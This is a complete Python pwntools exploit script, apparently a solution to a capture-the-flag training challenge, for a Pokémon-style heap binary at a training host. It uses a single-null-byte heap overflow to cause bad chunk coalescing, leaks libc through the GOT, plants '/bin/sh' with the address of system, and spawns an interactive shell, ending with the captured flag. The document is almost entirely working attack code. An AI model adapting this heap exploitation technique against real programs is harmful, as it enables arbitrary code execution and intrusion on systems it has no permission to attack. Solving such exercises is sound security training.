from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./pkm_nopie")
    gdb.attach(r, """
            # b *0x00401255
            c
            """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2025)


def create():
    sleep(0.1)
    r.sendline(b"0")


def rename(pkm, length, name):
    sleep(0.1)
    length = str(length)
    pkm = str(pkm)
    r.sendline(b"1")
    r.recvuntil("> ")
    r.sendline(pkm)
    r.recvuntil(": ")
    r.sendline(length)
    sleep(0.1)
    r.sendline(name)


def kill(pkm):
    sleep(0.1)
    pkm = str(pkm)
    r.sendline(b"2")
    r.recvuntil("> ")
    r.sendline(pkm)


def fight(attacker, defender, move):
    sleep(0.1)
    attacker = str(attacker)
    defender = str(defender)
    move = str(move)
    r.sendline(b"3")
    r.recvuntil("> ")
    r.sendline(attacker)
    r.recvuntil("> ")
    r.sendline(move)
    r.recvuntil("> ")
    r.sendline(defender)


def info(pkm):
    sleep(0.1)
    pkm = str(pkm)
    r.sendline(b"4")
    # input("debugging stop")
    r.recvuntil("> ")
    r.sendline(pkm)
    return r.recvuntil(b"*ATK")[-12:-6]


# input("Press enter to start")
start = time.time()
freeGotLeak = 0x404018

print(time.time() - start, " seconds elapsed. Creating pkms for the exploit.")
create()  # pkm0
create()  # pkm1
create()  # pkm2

print(time.time() - start, " seconds elapsed. Setting up the heap for the poisoning.")
# setup stack for poisoning
rename(2, 0x100, b"2"*0x100)  # name2
create()  # pkm3
rename(3, 0x28, b"3"*0x20)  # name3
rename(1, 0xf0, b"1"*0xf0)  # name1
create()  # pkm anti coalesc

print(time.time() - start, " seconds elapsed. Poisoning.")
rename(2, 1000, b"X"*1000)  # free old name2
rename(3, 0x28, b"D"*0x20 + p64(0x110+0x100+0x30))  # poison name1 chunk
rename(1, 1000, b"Y"*1000)  # cause bad coalescing
# place the got address in place of the name of pkm3
rename(0, 0x210, b"A"*0x138 + p64(freeGotLeak))

print(time.time() - start, " seconds elapsed. Getting the leak of libc.")
libcLeak = int.from_bytes(info(3), 'little')
# found statically with gdb (offset = got leak - start of libc)
offsetFromStartOfLibc = 0x7ffff7a816c0 - 0x7ffff79ed000
libc = libcLeak - offsetFromStartOfLibc
# libcFinder = ELF("./libc-2.27_notcache.so")
# systemFuncOffset = libcFinder.functions["system"].address #returns 0x4e5f0
systemFuncAddress = 0x4e5f0 + libc
print("libc leak: ", hex(libcLeak))
print("libc start: ", hex(libc))
print("system address: ", hex(systemFuncAddress))

print(time.time() - start, " seconds elapsed. Setting up the call to system.")
# place the address of system as the move 0 of pkm3
rename(0, 0x210, b"\0"*0x110 + b"/bin/sh\0" +
       b"\0"*88 + p64(systemFuncAddress))

print(time.time() - start, " seconds elapsed. Getting the shell.")
fight(3, 0, 0)  # use move 0 of pkm3 (which now calls system)

print("You have ", 7 - (time.time() - start), " seconds left!")

r.interactive()

# flag{such_a_beautiful_exploit!just_a_single_zero_byte}
